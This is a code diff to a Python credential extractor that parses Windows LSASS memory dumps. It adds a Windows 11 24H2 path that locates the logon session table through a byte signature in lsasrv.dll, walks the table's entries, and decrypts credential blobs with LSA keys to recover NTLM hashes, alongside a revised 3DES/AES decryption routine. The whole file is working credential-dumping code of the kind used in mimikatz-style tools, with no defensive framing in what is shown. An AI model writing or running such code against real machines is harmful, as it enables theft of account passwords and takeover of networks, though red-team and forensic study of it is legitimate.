@@ -305,36 +305,34 @@ class CredentialExtractor:
 
         iv = self._keys.iv
 
-        if len(encrypted) % 8 == 0 and len(encrypted) <= 24 and self._keys.des_key:
-            # Use 3DES for small blocks
-            cipher = DES3.new(self._keys.des_key, DES3.MODE_CBC, iv[:8])
-            return cipher.decrypt(encrypted)
-        elif self._keys.aes_key:
-            # Use AES-CFB for larger blocks
+        if len(encrypted) % 8 != 0:
+            # Not divisible by 8: use AES-CFB
+            if not self._keys.aes_key:
+                return b""
             cipher = AES.new(self._keys.aes_key, AES.MODE_CFB, iv, segment_size=128)
             return cipher.decrypt(encrypted)
-
-        return b""
+        else:
+            # Divisible by 8: use 3DES-CBC
+            if not self._keys.des_key:
+                return b""
+            cipher = DES3.new(self._keys.des_key, DES3.MODE_CBC, iv[:8])
+            return cipher.decrypt(encrypted)
 
     def _extract_msv(self) -> list[Credential]:
-        """Extract MSV1.0 credentials (NTLMv1/v2 hashes).
+        """Extract MSV1.0 credentials (NTLM hashes).
 
-        Walks the MSV1.0 credential list in msv1_0.dll memory.
-        For newer builds (26000+), uses data-section linked list scanning.
+        For build >= 26000 (Win11 24H2): find logon session table via signature
+        in lsasrv.dll, walk entries, follow credential chain, decrypt.
+        For older builds: use traditional pattern matching.
         """
-        credentials = []
+        if self._build >= 26000:
+            return self._extract_msv_24h2()
 
+        credentials = []
         msv = self.dump.find_module("msv1_0")
         if not msv:
             return credentials
 
-        # For build 26000+ (Win11 24H2), traditional patterns don't work
-        # Use data-section linked list scan
-        if self._build >= 26000:
-            return self._extract_msv_listscan(msv)
-
-        # Find the credential list by searching for known patterns in msv1_0.dll
-        # The list head pointer is near a specific signature
         pattern = self._get_msv_pattern()
         if not pattern:
             return credentials
@@ -343,56 +341,77 @@ class CredentialExtractor:
         for addr in results:
             if not (msv.base_address <= addr < msv.base_address + msv.size):
                 continue
-
             creds = self._walk_msv_list(addr)
             credentials.extend(creds)
             if creds:
-                break  # Found the right list
-
+                break
         return credentials
 
-    def _extract_msv_listscan(self, msv) -> list[Credential]:
-        """Extract MSV credentials by scanning for linked lists in msv1_0's data section.
+    def _extract_msv_24h2(self) -> list[Credential]:
+        """Extract MSV credentials for Win11 24H2 (build 26000+).
 
-        For Windows 11 24H2 (build 26000+) where traditional byte patterns no longer match.
+        1. Find signature in lsasrv.dll code
+        2. Resolve the logon session hash table address
+        3. Walk non-empty buckets
+        4. For each session: follow Credentials_list_ptr -> PrimaryCredentials
+        5. Decrypt encrypted_credentials blob with LSA keys
+        6. Parse decrypted data for NtOwfPassword
         """
         credentials = []
+        lsasrv = self.dump.find_module("lsasrv")
+        if not lsasrv:
+            return credentials
 
-        # Find data/writable segments of msv1_0 (typically in the upper half of the module)
-        data_start = msv.base_address + (msv.size // 2)
-        data_segs = [
-            s for s in self.dump.memory
-            if data_start <= s.start < msv.base_address + msv.size
-        ]
+        # Signature for Win11 24H2+
+        sig = b"\x45\x89\x34\x24\x8b\xfb\x45\x85\xc0\x0f"
+        hits = self.dump.search_memory(sig)
+        sig_addr = None
+        for h in hits:
+            if lsasrv.base_address <= h < lsasrv.base_address + lsasrv.size:
+                sig_addr = h
+                break
+        if sig_addr is None:
+            return credentials
 
-        # Scan for linked list head pointers
-        for seg in data_segs:
-            for offset in range(0, seg.size - 8, 8):
-                val = struct.unpack_from("<Q", seg.data, offset)[0]
-                if not (0x100000000 < val < 0x800000000000):
-                    continue
+        # Resolve table address using RIP-relative addressing:
+        # LEA r13, [rip+disp1]  at sig+0x16 → lsasrv_base
+        # LEA rdx, [r13+disp2] at sig+0x1F → table_base
+        # disp1 at sig+0x19 (4 bytes signed), disp2 at sig+0x22 (4 bytes signed)
+        ctx = self.dump.read_memory(sig_addr, 48)
+        if not ctx:
+            return credentials
 
-                list_head_addr = seg.start + offset
-                # Check if this is a valid list (Flink of target has valid Blink back to us)
-                target_data = self.dump.read_memory(val, 16)
-                if not target_data:
-                    continue
-                flink = struct.unpack_from("<Q", target_data, 0)[0]
-                blink = struct.unpack_from("<Q", target_data, 8)[0]
+        disp1 = struct.unpack_from("<i", ctx, 0x19)[0]
+        base_addr = sig_addr + 0x19 + 4 + disp1  # RIP-relative resolution
 
-                # Valid list: blink of first entry == list_head, or single-entry list
-                if blink != list_head_addr:
-                    continue
-                if flink == list_head_addr:
-                    continue  # Empty list (points back to self)
+        disp2 = struct.unpack_from("<i", ctx, 0x22)[0]
+        table_addr = base_addr + disp2
 
-                # Walk and try to parse as MSV entries
-                creds = self._walk_msv_list_26k(list_head_addr)
-                if creds:
-                    credentials.extend(creds)
-                    # Don't return early — continue scanning for more lists
+        # Walk all buckets in the hash table (count from offset2)
+        # Read up to 64 buckets, each 16 bytes (LIST_ENTRY)
+        for bucket in range(64):
+            bucket_addr = table_addr + bucket * 16
+            bucket_data = self.dump.read_memory(bucket_addr, 16)
+            if not bucket_data:
+                break
+            flink = struct.unpack_from("<Q", bucket_data, 0)[0]
+            if flink == 0 or flink == bucket_addr:
+                continue
 
-        # Deduplicate by (username, domain)
+            # Walk linked list in this bucket
+            current = flink
+            visited = set()
+            while current not in visited and current != 0 and current != bucket_addr:
+                visited.add(current)
+                cred = self._parse_logon_session_24h2(current)
+                if cred:
+                    credentials.append(cred)
+                next_ptr = self.dump.read_ptr(current)
+                if not next_ptr:
+                    break
+                current = next_ptr
+
+        # Deduplicate
         seen = set()
         unique = []
         for c in credentials:
@@ -402,105 +421,90 @@ class CredentialExtractor:
                 unique.append(c)
         return unique
 
-    def _walk_msv_list_26k(self, list_head: int) -> list[Credential]:
-        """Walk MSV credential list for build 26000+ structure format."""
-        credentials = []
+    def _parse_logon_session_24h2(self, addr: int) -> Credential | None:
+        """Parse a KIWI_MSV1_0_LIST_65 logon session entry (Win11 24H2).
 
-        first_data = self.dump.read_memory(list_head, 8)
-        if not first_data:
-            return credentials
-        first_entry = struct.unpack_from("<Q", first_data)[0]
-
-        current = first_entry
-        visited = set()
-
-        for _ in range(256):
-            if current in visited or current == 0 or current == list_head:
-                break
-            visited.add(current)
-
-            cred = self._parse_msv_entry_26k(current)
-            if cred:
-                credentials.append(cred)
-
-            # Next entry (Flink at offset 0)
-            next_ptr = self.dump.read_ptr(current)
-            if not next_ptr:
-                break
-            current = next_ptr
-
-        return credentials
-
-    def _parse_msv_entry_26k(self, addr: int) -> Credential | None:
-        """Parse MSV entry for build 26000+ (Win11 24H2).
-
-        Structure offsets determined by reverse engineering:
-        +0x28: "NTLM" tag (4 bytes)
-        +0x48: Username UNICODE_STRING
-        +0x58: Domain UNICODE_STRING
-        +0x7C: Credential blob size (DWORD)
-        +0x80: pCredentials pointer
-
-        On build 26000+, the pCredentials blob stores a credential isolation
-        handle (not the encrypted hash directly). The actual NTLM hash is in
-        a separate heap structure. We find it by searching the dump for the
-        credential pattern associated with this username.
+        Key offsets:
+        +0x70: LUID (8 bytes)
+        +0xA0: UserName (UNICODE_STRING, 16 bytes)
+        +0xB0: Domaine (UNICODE_STRING, 16 bytes)
+        +0xE8: LogonType (ULONG, 4 bytes)
+        +0x118: Credentials_list_ptr (POINTER, 8 bytes)
         """
-        entry = self.dump.read_memory(addr, 256)
+        entry = self.dump.read_memory(addr, 0x120)
         if not entry:
             return None
 
-        # Check for "NTLM" tag at +0x28 (signature of MSV entry)
-        if entry[0x28:0x2C] != b"NTLM":
-            return None
-
-        # Read username and domain
-        username = self._read_unicode_string(addr + 0x48)
-        domain = self._read_unicode_string(addr + 0x58)
-
+        username = self._read_unicode_string_from(entry, 0xA0)
+        domain = self._read_unicode_string_from(entry, 0xB0)
         if not username:
             return None
 
-        # Read credential blob size
-        blob_size = struct.unpack_from("<I", entry, 0x7C)[0]
-        if blob_size == 0:
+        creds_ptr = struct.unpack_from("<Q", entry, 0x118)[0]
+        if creds_ptr == 0:
             return None
 
-        # Search for the actual plaintext hash in the dump.
-        # The hash is in a credential structure with the pattern:
-        # [isNtOwf=01 00 00 00] + [padding 8 bytes] + [00 00] + [username_len LE16]
-        # ... then at offset +32 from isNtOwf: NTLM hash (16 bytes) + LM hash (16 zeros)
-        username_len = len(username.encode("utf-16-le"))
-        username_len_bytes = struct.pack("<H", username_len)
+        # Follow: Credentials_list_ptr → KIWI_MSV1_0_CREDENTIAL_LIST
+        # +0: Flink (8), +8: AuthPkgId (4) + pad (4), +16: PrimaryCredentials_ptr (8)
+        cred_list = self.dump.read_memory(creds_ptr, 24)
+        if not cred_list:
+            return None
+        prim_ptr = struct.unpack_from("<Q", cred_list, 16)[0]
+        if prim_ptr == 0:
+            return None
 
-        # Pattern: isNtOwf(4) + zeros(10) + username_len(2) -> 16 bytes total
-        # Then 16 bytes later: the NTLM hash
-        search_pattern = (
-            b"\x01\x00\x00\x00"          # isNtOwfPassword = TRUE
-            + b"\x00" * 10                 # padding/zeros
-            + username_len_bytes           # username length
+        # Follow: PrimaryCredentials_ptr → KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
+        # +0: Flink (8), +8: Primary ANSI_STRING (16), +24: encrypted_credentials (16)
+        prim = self.dump.read_memory(prim_ptr, 40)
+        if not prim:
+            return None
+        enc_len = struct.unpack_from("<H", prim, 24)[0]
+        enc_ptr = struct.unpack_from("<Q", prim, 32)[0]
+        if enc_len == 0 or enc_ptr == 0:
+            return None
+
+        # Read and decrypt the credential blob
+        encrypted = self.dump.read_memory(enc_ptr, enc_len)
+        if not encrypted:
+            return None
+        decrypted = self._lsa_decrypt(encrypted)
+        if not decrypted or len(decrypted) < 86:
+            return None
+
+        # Parse MSV1_0_PRIMARY_CREDENTIAL_11_H24_DEC (no credKeyType field):
+        # +40: isIso (1), +41: isNtOwfPassword (1)
+        # +48: isoSize (2)
+        # +50: DPAPIProtected (20)
+        # +70: NtOwfPassword (16)
+        # +86: LmOwfPassword (16)
+        is_iso = decrypted[40]
+        is_nt = decrypted[41]
+        if is_iso or not is_nt:
+            return None
+
+        nt_hash = decrypted[70:86]
+        if nt_hash == b"\x00" * 16:
+            return None
+
+        return Credential(
+            username=username,
+            domain=domain,
+            auth_type="msv1_0",
+            ntlm_hash=nt_hash.hex(),
         )
 
-        results = self.dump.search_memory(search_pattern)
-        for match_addr in results:
-            # The NTLM hash should be 32 bytes after the isNtOwf flag
-            nt_hash = self.dump.read_memory(match_addr + 32, 16)
-            if not nt_hash or nt_hash == b"\x00" * 16:
-                continue
-
-            # Verify: LM hash (16 zeros) should follow
-            lm_hash = self.dump.read_memory(match_addr + 48, 16)
-            if lm_hash != b"\x00" * 16:
-                continue
-
-            return Credential(
-                username=username,
-                domain=domain,
-                auth_type="msv1_0",
-                ntlm_hash=nt_hash.hex(),
-            )
-
-        return None
+    def _read_unicode_string_from(self, buf: bytes, offset: int) -> str:
+        """Read a UNICODE_STRING from a buffer (Length at offset, Buffer ptr at offset+8)."""
+        if offset + 16 > len(buf):
+            return ""
+        length = struct.unpack_from("<H", buf, offset)[0]
+        ptr = struct.unpack_from("<Q", buf, offset + 8)[0]
+        if length == 0 or ptr == 0:
+            return ""
+        raw = self.dump.read_memory(ptr, length)
+        if not raw:
+            return ""
+        return raw.decode("utf-16-le", errors="replace")
 
     def _get_msv_pattern(self) -> bytes | None:
         """Get the pattern to find MSV credential list based on build."""
